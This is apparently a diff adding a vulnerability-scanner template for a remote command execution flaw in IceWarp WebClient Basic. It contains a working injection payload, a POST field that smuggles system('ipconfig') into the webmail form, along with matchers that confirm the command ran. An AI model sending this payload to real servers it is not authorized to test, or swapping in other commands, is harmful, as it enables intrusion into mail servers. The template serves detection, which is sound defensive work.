@@ -1,0 +1,36 @@
+id: icewarp-webclient-basic-rce
+info:
+  name: IceWarp WebClient Basic Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template identifies a remote command execution vulnerability in the IceWarp WebClient Basic interface.
+
+http:
+  - raw:
+      - |
+        POST /webmail/basic/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _dlg[captcha][target]=system('ipconfig')
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "Windows IP"
+          - "DNS"
+      - type: word
+        part: header
+        words:
+          - "IceWarp"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
